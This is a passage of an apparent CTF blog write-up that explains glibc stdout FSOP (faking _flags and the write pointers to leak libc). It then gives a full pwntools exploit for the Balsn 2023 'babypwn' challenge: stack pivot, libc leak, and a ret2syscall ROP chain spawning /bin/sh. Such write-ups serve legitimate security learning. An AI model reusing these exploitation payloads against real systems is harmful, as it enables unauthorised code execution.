+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>Control Flow:</p>
+<ol>
+<li><p>check the file is writable : <code>if (f-&gt;_flags &amp; _IO_NO_WRITES</code></p>
+</li>
+<li><p>checking stuff</p>
+</li>
+<li><p>finally, if <code>ch = EOF</code> call <code>_IO_do_write</code></p>
+<p> → note <code>_IO_do_write</code></p>
+</li>
+</ol>
+<p><code>_IO_do_write</code> </p>
+<ul>
+<li><p>src</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">          || (<span class="type">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><code>new_do_write</code></p>
+<ul>
+<li><p>scr</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>It will call <code>_IO_SYSWRITE</code> in our exploit, it is a leak.</p>
+<h2 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h2><h3 id="1-hijack-vtable"><a href="#1-hijack-vtable" class="headerlink" title="1.  hijack vtable"></a>1.  hijack vtable</h3><p>overwrite vtable and put appropriate address that we want to call in the vtable struct</p>
+<h3 id="2-leak-libc"><a href="#2-leak-libc" class="headerlink" title="2. leak libc"></a>2. leak libc</h3><aside>
+💡 Fake _flags and _IO_write_base then a function using stdout (puts,printf) call after , we will get the libc address
+
+</aside>
+
+<p><img src="https://hackmd.io/_uploads/BJ-1VTIW6.png"></p>
+<p><strong>Analysis :</strong></p>
+<ul>
+<li><p>__flags have 4 bytes</p>
+<ul>
+<li><p>first 2 byte is <code>_IO_MAGIC</code> (<code>0xFBAD0000</code>)</p>
+</li>
+<li><p>the rest is flags</p>
+</li>
+<li><p>all flags</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Magic number and bits for the _flags field.  The magic number is</span></span><br><span class="line"><span class="comment">   mostly vestigial, but preserved for compatibility.  It occupies the</span></span><br><span class="line"><span class="comment">   high 16 bits of _flags; the low 16 bits are actual flag bits.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC         0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK    0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don&#x27;t deallocate buffer on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED        0x0002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS          0x0004 <span class="comment">/* Reading not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES         0x0008 <span class="comment">/* Writing not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN          0x0010</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN          0x0020</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x0040 <span class="comment">/* Don&#x27;t call close(_fileno) on close.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED            0x0080 <span class="comment">/* In the list of all open files.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP         0x0100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF          0x0200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET      0x0400 <span class="comment">/* Put and get pointer move in unison.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING      0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF        0x2000</span></span><br><span class="line">                           <span class="comment">/* 0x4000  No longer used, reserved for compat.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK         0x8000</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>  → we need to note <code>_IO_CURRENTLY_PUTTING</code> (0x800) and <code>_IO_IS_APPENDING</code> (0x1000)
+  </p>
+</li>
+<li><p>From the vtable, we need to note:</p>
+<ul>
+<li>__overflow</li>
+<li>__xsputn</li>
+<li>__write</li>
+</ul>
+</li>
+<li><p><code>puts</code> → <code>__IO_puts</code> → <code>_IO_new_file_xsputn</code> <strong>→</strong> <code>_IO_new_file_overflow</code> → <code>_IO_do_write</code></p>
+</li>
+<li><p><code>_IO_do_write</code> → <code>_IO_new_do_write</code> → <code>new_do_write</code></p>
+</li>
+<li><p>finally it will call <code>_IO_SYSWRITE(f, f→_IO_write_base, f→_IO_write_ptr - f→_IO_write_base)</code></p>
+<p>  → output <code>stdout→_IO_write_base</code> with length of <code>f→_IO_write_ptr - f→_IO_write_base</code> to stdout</p>
+</li>
+</ul>
+<p><strong>To-do :</strong> </p>
+<ul>
+<li><p>need to bypass 2 if statements in <code>_IO_new_file_overflow</code>:</p>
+<ol>
+<li><p>first : </p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES)</span><br></pre></td></tr></table></figure>
+<p> → _flags ≠ <code>_IO_NO_WRITES</code> (0x0008)</p>
+</li>
+<li><p>second :</p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>
+<p> → flags &#x3D; <code>_IO_CURRENTLY_PUTTING</code> (0x800) or  <code>_IO_write_base</code> ≠ NULL</p>
+</li>
+</ol>
+</li>
+<li><p>bypass another if statements in <code>new_do_write</code> :</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br></pre></td></tr></table></figure>
+<p>  → _flag &#x3D; <code>_IO_IS_APPENDING</code> (0x1000)</p>
+</li>
+</ul>
+<h2 id="How-to-leak-libc"><a href="#How-to-leak-libc" class="headerlink" title="How to leak libc"></a>How to leak libc</h2><ol>
+<li>overwrite <code>_flag</code> to <code>0xfbad1800</code></li>
+<li>overwrite <code>_IO_read_ptr</code>, <code> _IO_read_end</code>, <code>_IO_read_base</code>, <code>_IO_write_base</code> to the ptr that have an address we want to leak</li>
+<li>overwrite <code>_IO_write_ptr</code>, <code>_IO_write_end</code>, <code>_IO_buf_base</code>, <code>_IO_buf_end</code> to <code>ptr + x</code> (it will leak x byte). That ptr must in read and writable address.</li>
+<li>call puts -&gt; leak.</li>
+</ol>
+<h2 id="DEMO-balsn-babypwn-2023"><a href="#DEMO-balsn-babypwn-2023" class="headerlink" title="DEMO balsn babypwn 2023"></a>DEMO balsn babypwn 2023</h2><p>We are given a simple binary </p>
+<p><img src="https://hackmd.io/_uploads/B1qTwTLWT.png"></p>
+<p><img src="https://hackmd.io/_uploads/Byi0waU-T.png"></p>
+<p>But we dont have pop rdi gadget</p>
+<p><img src="https://hackmd.io/_uploads/rJV-_6Uba.png"></p>
+<p>We cannot do ret2dlresolve due to Full Relro. ret2csu is also impossible to do. So we will do some special techniques. After that ctf end, people mostly solved it in three ways :</p>
+<ul>
+<li>bruteforce libc by using one_gadget (LMAO)</li>
+<li>use add eax gadget to point eax to the area that have libc address then call puts to leak libc.</li>
+<li>use fsop</li>
+</ul>
+<p>I will use fsop in this exploit.</p>
+<p>We will do that in three part : </p>
+<ul>
+<li>Stack pivot to bss </li>
+<li>Overwrite the stdout ptr in the bss by using FSOP</li>
+<li>Leak libc -&gt; ret2syscall</li>
+</ul>
+<h3 id="Stack-pivot-to-bss"><a href="#Stack-pivot-to-bss" class="headerlink" title="Stack pivot to bss:"></a>Stack pivot to bss:</h3><p>This is just a very simple process. Note that i use a very high address (bss + 0x400)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+p64(exe.bss()+<span class="number">0x400</span> + <span class="number">0x20</span>)+p64(exe.sym[<span class="string">&#x27;main&#x27;</span>]+<span class="number">42</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+p64(<span class="number">0x404200</span>+<span class="number">0x20</span>)+p64(exe.sym[<span class="string">&#x27;main&#x27;</span>]+<span class="number">42</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">```    </span><br><span class="line"><span class="comment">### FSOP</span></span><br><span class="line"></span><br><span class="line">This <span class="keyword">is</span> the hard part. The big question <span class="keyword">in</span> this step <span class="keyword">is</span> how to overwrite the stdout ptr. My idea <span class="keyword">is</span> use the `leave, ret` gadget. </span><br><span class="line"></span><br><span class="line">EX : rsp = a , rbp = b (b <span class="keyword">is</span> point to c). Now when we call `leave, ret` it will become rsp = b+<span class="number">8</span>, rbp = c.</span><br><span class="line"></span><br><span class="line">Using the above example, we can utilize it to make the rbp point to that stdout ptr. But here <span class="keyword">is</span> one big problem : the stdout ptr <span class="keyword">is</span> store <span class="keyword">in</span> `<span class="number">0x404010</span>` which <span class="keyword">is</span> the beginning of the bss. So when we call `gets` it will get sigsegv because libc will push something to our bss() <span class="keyword">and</span> at some point it will go to some uninitialized address.  </span><br><span class="line"></span><br><span class="line">So how to bypass it ?. This make me stuck <span class="keyword">for</span> a very long time. After <span class="built_in">all</span>, i realised when call `puts` (<span class="keyword">with</span> our rsp <span class="keyword">is</span> now point to bss) the bss will have stdout address !. By using stack cached we can bypass the above problem (using another address <span class="keyword">not</span> <span class="number">0x404010</span>). </span><br><span class="line"></span><br><span class="line">![](https://hackmd.io/_uploads/SJ3ApaLZp.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Another problem <span class="keyword">is</span> when we do the `leave, ret` to overwrite the new stdout ptr `addr1` , our rsp ptr will now point to `addr1 + <span class="number">8</span>` <span class="keyword">and</span> will look <span class="keyword">for</span> address to <span class="keyword">return</span>. So before overwrite that new ptr, we must overwrite `addr1 + <span class="number">8</span>` to point to some useful ropchain <span class="keyword">in</span> our program.</span><br><span class="line"></span><br><span class="line">More problem appear !!!. After we overwrite that ptr, <span class="keyword">and</span> puts leak the libc. The leave, ret instruction will execute again ! <span class="keyword">and</span> will make our rsp point to some location <span class="keyword">in</span> the libc (writable of course) so we must also overwrite it to new ropchain. In order to do that <span class="keyword">and</span> <span class="keyword">not</span> overwrite the vtable, we must partial overwrite lower address of `addr1` to `\x00` </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Now we can fsop by : </span><br><span class="line"><span class="number">1.</span> overwrite `_flag` to `<span class="number">0xfbad1800</span>`</span><br><span class="line"><span class="number">2.</span> overwrite `_IO_read_ptr`, ` _IO_read_end`, `_IO_read_base`, `_IO_write_base` to got table (<span class="built_in">any</span> function you like)</span><br><span class="line"><span class="number">3.</span> overwrite `_IO_write_ptr`, `_IO_write_end`, `_IO_buf_base`, `_IO_buf_end` to `ptr` (that `ptr` must be the bss to make it writable )</span><br><span class="line"><span class="number">4.</span> call puts -&gt; leak.</span><br><span class="line"><span class="comment">### ret2syscall</span></span><br><span class="line"></span><br><span class="line">This <span class="keyword">is</span> the final step, <span class="keyword">and</span> <span class="keyword">with</span> the libc we can easily get shell</span><br><span class="line"></span><br><span class="line">```python!</span><br><span class="line">poprdi = libc.address + <span class="number">0x000000000002a3e5</span></span><br><span class="line">poprsi = libc.address + <span class="number">0x000000000002be51</span></span><br><span class="line">poprdx = libc.address + <span class="number">0x00000000000796a2</span></span><br><span class="line">poprax = libc.address + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall = libc.address + <span class="number">0x0000000000029db4</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(poprdi)+p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(poprsi)+p64(<span class="number">0</span>)+p64(poprdx)+p64(<span class="number">0</span>)+p64(poprax)+p64(<span class="number">0x3b</span>)+p64(syscall)</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Recap"><a href="#Recap" class="headerlink" title="Recap"></a>Recap</h3><ol>
+<li>Stack pivot to bss </li>
+<li>Read again in the bss , puts to make the bss have the new stdout <code>ptr1</code></li>
+<li>overwrite the lower address of that <code>ptr1</code> to <code>\x00</code></li>
+<li>overwrite <code>ptr1+8</code> to ropchain</li>
+<li>return to the above ropchain, now we can fsop stdout</li>
+<li>fsop stdout and ropchain in here</li>
+<li>return to bss and do ret2syscall</li>
+<li>get shell</li>
+</ol>
+<p>Script : </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line">context.binary = exe = ELF(&quot;chall_patched&quot;)</span><br><span class="line">libc = ELF(&quot;libc.so.6&quot;)</span><br><span class="line">if (args.REMOTE):</span><br><span class="line">        p = remote()</span><br><span class="line">else :</span><br><span class="line">        p = process(exe.path)</span><br><span class="line"></span><br><span class="line">sla = lambda msg, data: p.sendlineafter(msg, data)</span><br><span class="line">sa = lambda msg, data: p.sendafter(msg, data)</span><br><span class="line">sl = lambda data: p.sendline(data)</span><br><span class="line">s = lambda data: p.send(data)</span><br><span class="line"></span><br><span class="line">if (args.GDB):</span><br><span class="line">        gdb.attach(p,</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        b*0x00000000004011bb</span><br><span class="line">        b*0x00000000004011c6</span><br><span class="line">        c</span><br><span class="line">        &quot;&quot;&quot;)</span><br><span class="line">        input()</span><br><span class="line"></span><br><span class="line">poprbp = 0x000000000040115d</span><br><span class="line">leave = 0x00000000004011c5</span><br><span class="line">addrsp = 0x0000000000401016</span><br><span class="line">ret = 0x000000000040101a</span><br><span class="line"></span><br><span class="line">fake_file = p64(0xfbad1800)+p64(0x403fe8)*4+p64(exe.bss()+0x50)*4</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*32+p64(exe.bss()+0x400 + 0x20)+p64(exe.sym[&#x27;main&#x27;]+42)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*32+p64(0x404200+0x20)+p64(exe.sym[&#x27;main&#x27;]+42)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*32+p64(0x404340+8+0x20)+p64(exe.sym[&#x27;main&#x27;]+42)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*32+p64(0x404378+8+0x20)+p64(exe.sym[&#x27;main&#x27;]+42)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">payload = p64(0x4011a0)*4 + p64(0x404378) + p64(leave)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;\x00&#x27;*32 + p64(exe.bss()+0x100) + p64(exe.sym[&#x27;main&#x27;]+42)+b&#x27;\x00&#x27;*112+ fake_file</span><br><span class="line">sl(payload)</span><br><span class="line">for i in range(0,5):</span><br><span class="line">        p.recvline()</span><br><span class="line">leak = u64(p.recvn(8))</span><br><span class="line">libc.address = leak - libc.sym[&#x27;setvbuf&#x27;]</span><br><span class="line">print(&quot;leak : &quot;,hex(leak))</span><br><span class="line">print(&quot;base : &quot;,hex(libc.address))</span><br><span class="line"></span><br><span class="line">poprdi = libc.address + 0x000000000002a3e5</span><br><span class="line">poprsi = libc.address + 0x000000000002be51</span><br><span class="line">poprdx = libc.address + 0x00000000000796a2</span><br><span class="line">poprax = libc.address + 0x0000000000045eb0</span><br><span class="line">syscall = libc.address + 0x0000000000029db4</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*32+b&#x27;b&#x27;*8+p64(poprdi)+p64(next(libc.search(b&#x27;/bin/sh\x00&#x27;)))</span><br><span class="line">payload += p64(poprsi)+p64(0)+p64(poprdx)+p64(0)+p64(poprax)+p64(0x3b)+p64(syscall)</span><br><span class="line">sl(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rkKwGRIZa.png"></p>
+<h2 id="Credit"><a href="#Credit" class="headerlink" title="Credit"></a>Credit</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/34812">https://ctftime.org/writeup/34812</a></li>
+<li><a target="_blank" rel="noopener" href="https://rninche01.tistory.com/entry/stdout-flag%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-libc-leak?category=838537">https://rninche01.tistory.com/entry/stdout-flag%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-libc-leak?category=838537</a></li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        
+      
+      
+      
+      
+      
+      
+      
